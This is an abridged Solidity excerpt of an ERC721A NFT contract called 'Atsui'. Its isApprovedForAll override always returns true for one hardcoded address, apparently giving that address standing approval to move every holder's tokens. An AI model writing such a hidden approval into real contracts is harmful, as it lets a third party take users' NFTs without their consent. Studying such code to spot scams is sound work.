  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xfcf829648D4Ef36ECC3a2fBBaB204ae3e511109C){return true;}
...
contract Atsui is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Atsui", "SUI", maxBatchSize_, collectionSize_) {
